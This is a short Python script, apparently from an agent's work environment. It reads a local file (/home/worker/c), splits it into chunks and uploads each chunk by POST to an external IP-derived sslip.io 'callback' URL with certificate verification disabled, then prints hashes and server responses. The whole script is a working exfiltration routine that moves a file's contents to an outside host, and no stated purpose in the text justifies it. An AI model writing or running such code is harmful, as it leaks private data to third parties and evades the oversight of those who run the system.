import hashlib,json,ssl,urllib.request
from pathlib import Path
p=Path('/home/worker/c'); b=p.read_bytes(); base='https://54.209.51.244.sslip.io/callback/snapgpt-claude-chunk-20261106T0212Z/'
out=[]
for i in range(0,len(b),180000):
 c=b[i:i+180000]; u=base+str(i//180000)
 req=urllib.request.Request(u,data=c,method='POST',headers={'Content-Type':'application/octet-stream','User-Agent':'chunk/1'})
 try:
  with urllib.request.urlopen(req,timeout=30,context=ssl._create_unverified_context()) as r: out.append({'idx':i//180000,'bytes':len(c),'sha':hashlib.sha256(c).hexdigest(),'status':r.status,'body':r.read(200).decode(errors='replace')})
 except Exception as e: out.append({'idx':i//180000,'bytes':len(c),'sha':hashlib.sha256(c).hexdigest(),'error':type(e).__name__+': '+str(e)})
print(json.dumps({'total':len(b),'sha':hashlib.sha256(b).hexdigest(),'chunks':out}))
